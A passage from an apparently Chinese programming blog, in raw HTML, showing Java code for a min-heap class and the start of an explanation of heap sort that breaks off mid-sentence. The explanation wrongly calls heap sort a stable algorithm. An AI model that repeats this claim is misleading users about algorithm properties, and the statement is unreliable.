class=\"crayon-c\">/**</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-60\"><span class=\"crayon-c\">\t * remove the root of heap, return it's value, and adjust heap to maintain the heap's property. </span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-61\"><span class=\"crayon-c\">\t * O(logn)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-62\"><span class=\"crayon-c\">\t * &lt;a href='http://www.jobbole.com/members/wx1409399284'&gt;@return&lt;/a&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-63\"><span class=\"crayon-c\">\t */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-64\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">extractMin</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-65\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-e\">rangeCheck</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-66\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">last</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">size</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-67\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">last</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-68\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">size</span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-69\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-e\">siftDown</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-70\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-71\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-72\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">/**</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-73\"><span class=\"crayon-c\">\t * return an element's index, if not exists, return -1;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-74\"><span class=\"crayon-c\">\t * O(n)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-75\"><span class=\"crayon-c\">\t * @param x</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-76\"><span class=\"crayon-c\">\t * &lt;a href='http://www.jobbole.com/members/wx1409399284'&gt;@return&lt;/a&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-77\"><span class=\"crayon-c\">\t */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-78\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">search</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-79\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-80\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-81\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-82\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-83\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-84\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">/**</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-85\"><span class=\"crayon-c\">\t * return but does not remove the root of heap.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-86\"><span class=\"crayon-c\">\t * O(1)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-87\"><span class=\"crayon-c\">\t * &lt;a href='http://www.jobbole.com/members/wx1409399284'&gt;@return&lt;/a&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-88\"><span class=\"crayon-c\">\t */</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-89\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">peek</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-90\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-e\">rangeCheck</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-91\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-92\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-93\"><span class=\"crayon-h\">\t</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-94\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">siftUp</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-95\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-96\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-97\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;&gt;&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-98\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">p</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-99\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-st\">break</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-100\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">p</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-101\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">p</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-102\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-103\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-104\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-105\"><span class=\"crayon-h\">\t</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-106\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">siftDown</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-107\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-108\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">;</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">;</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-109\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">child</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-110\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">child</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-r\">child</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-r\">child</span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-111\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-r\">child</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-112\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-r\">child</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-113\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-st\">break</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-114\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-r\">child</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-115\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">child</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-116\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-117\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-118\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-119\"><span class=\"crayon-h\">\t</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-120\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">rangeCheck</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-121\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">!</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-122\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-st\">throw</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">RuntimeException</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"Index is out of boundary\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">\t</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-123\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-124\"><span class=\"crayon-h\">\t</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-125\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">expandSpace</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-126\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">nums</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Arrays</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">copyOf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">size *</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-127\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-128\"><span class=\"crayon-h\">\t</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-129\"><span class=\"crayon-h\">\t</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">href</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'http://www.jobbole.com/members/wx610506454'</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">Override</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">a</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-130\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">toString</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-131\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-c\">// TODO Auto-generated method stub</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-132\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-e\">StringBuilder </span><span class=\"crayon-v\">sb</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">StringBuilder</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-133\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">sb</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">append</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"[\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-134\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-135\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-v\">sb</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">append</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">String</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">format</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\", \"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"%d\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-136\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">sb</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">append</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"]\\n\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-137\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sb</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">toString</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-138\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-139\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0198 seconds] -->\r\n<p></p>\n<h2 id=\"2-堆的应用：堆排序\">2.堆的应用：堆排序</h2>\n<p>运用堆的性质，我们可以得到一种常用的、稳定的、高效的排序算法————<strong>堆排序</strong>。堆排序的时间复杂度为<code>O(n*log(n))</code>，空间复杂度为<code>O(1)</code>，堆排序的思想是：<br>\n对于含有<code>n</code>个元素的无序数组<code>nums</code>, 构建一个堆(这里是小顶堆)<code>heap</code>，然后执行<code>extractMin</code>得到最小的元素，这样执行<code>n</code>次得到序列就是排序好的序列。<br>\n如果是降序排列则是小顶堆；否则利用大顶堆。</p>\n<p><strong>Trick</strong></p>\n<p>由于<code>extractMin</code>执行完毕后，最后一个元素<code>last</code>已经被移动到了<code>root</code>，因此可以将<code>extractMin</code>返回的元素放置于最后，这样可以得到<code>sort in 